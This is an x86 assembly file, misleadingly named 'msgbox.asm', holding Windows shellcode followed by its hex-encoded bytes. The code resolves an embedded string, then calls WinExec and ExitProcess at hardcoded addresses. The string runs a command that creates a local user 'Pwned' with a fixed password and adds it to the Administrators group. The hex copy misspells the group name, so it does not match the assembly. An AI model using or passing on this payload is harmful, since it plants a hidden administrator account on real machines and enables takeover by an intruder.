;msgbox.asm 
[SECTION .text]

global _start


_start:
xor ecx, ecx
mul ecx

jmp command
WinExec:
pop ecx
mov [ecx+89],dl
push edx
push ecx
mov eax,0x768d2c51
call eax

push edx
mov eax, 0x768579b0
call eax
command:
call WinExec
db "cmd.exe /c net user Pwned ThisIsALongP@ss /ADD && net localgroup Administrators /ADD PwnedN"

;31c9f7e1eb15598851595251b8512c8d76ffd052b8b0798576ffd0e8e6ffffff636d642e657865202f63206e657420757365722050776e656420546869734973414c6f6e6750407373202f414444202626206e6574206c6f63616c67726f75702041646d696e69737472746f7273202f4144442050776e65644e